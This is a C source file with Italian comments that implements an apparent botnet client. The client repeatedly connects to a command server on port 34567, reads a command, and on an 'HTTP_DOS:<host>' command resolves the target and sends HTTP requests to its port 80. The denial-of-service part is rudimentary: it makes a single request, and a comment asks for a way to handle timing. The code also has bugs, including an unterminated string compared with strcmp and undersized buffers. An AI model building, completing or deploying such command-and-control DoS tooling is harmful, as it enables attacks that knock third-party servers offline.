#include <stdio.h> //printf
#include <stdlib.h> //atoi
#include <string.h>    //strlen
#include <sys/socket.h>    //socket
#include <arpa/inet.h> //inet_addr
#include <netinet/tcp.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
//Prototipi funzioni
void create_conn(int sock, char *server_ip, int server_port);
void expression_handler(char *command);
void hdos_exe(char *address);
int hostname_to_ip(char * hostname, char *ip);
int main(){
	//Dichiarazione variabili
	int sockfd, server_port=34567;
	char server_reply[100];
	char server_ip[15]="127.0.0.1";
	//Creo il socket
    sockfd = socket(AF_INET , SOCK_STREAM , 0);
    create_conn(sockfd, server_ip,server_port);
    printf("Connessione creata \n");
    printf("REMINDER: FATTE LI CAZZI TUA\n");
	recv(sockfd , server_reply , 100 , 0);
	printf("Comando ricevuto: %s \n",server_reply);
	//Gestisco i comandi del server
	expression_handler( server_reply);
	
	return 0;
	getchar();
	   // expression_handler(server_reply);
	
}
//Funzione per inizializzare la connessione
void create_conn(int sock, char *server_ip, int server_port){
	int ris;
	struct sockaddr_in server;
	server.sin_addr.s_addr = inet_addr(server_ip);
	server.sin_family = AF_INET;
	server.sin_port = htons( server_port );
	//Connect to remote server
	ris=connect(sock , (struct sockaddr *)&server , sizeof(server));
	while(ris<0){  // Finchè non avviene la connessione
		ris=connect(sock , (struct sockaddr *)&server , sizeof(server));		
	}
	}
//Funzione per gesire
void expression_handler(char command[100]){
	char hdos[8]="HTTP_DOS";
	char delim[2]=":";
	char *token;
	token = strtok(command, delim);
	//token = strtok(NULL, delim);
	//printf("Token2 %s", token);
	if(strcmp(hdos,token)==0){
        token = strtok(NULL,delim);
        hdos_exe(token);
        
    }
	}

void hdos_exe(char *address){
	int sock_dos;
	char ip[15];
	char server_ris[512];
	sock_dos=socket(AF_INET, SOCK_STREAM, 0);
	hostname_to_ip(address,ip);
	printf("%s\n", ip);
	create_conn(sock_dos, ip, 80);
	//TROVA UN MODO PER GESTIRE IL TEMPO
	send(sock_dos, "GET /\r\n", strlen("GET /\r\n"),0); 
	recv(sock_dos,server_ris,512,0);
	printf("%s\n", server_ris);


}

int hostname_to_ip(char * hostname, char *ip)
{
	struct hostent *he;
	struct in_addr **addr_list;
	int i;
	if (( he = gethostbyname( hostname ))==NULL)
	{
		//Host info
		return 1;
	}	
	addr_list = (struct in_addr **) he->h_addr_list;
	for (i=0; addr_list[i] != NULL; i++){
		strcpy(ip, inet_ntoa(*addr_list[i]));
		return 0;
	}
	return 1;
}
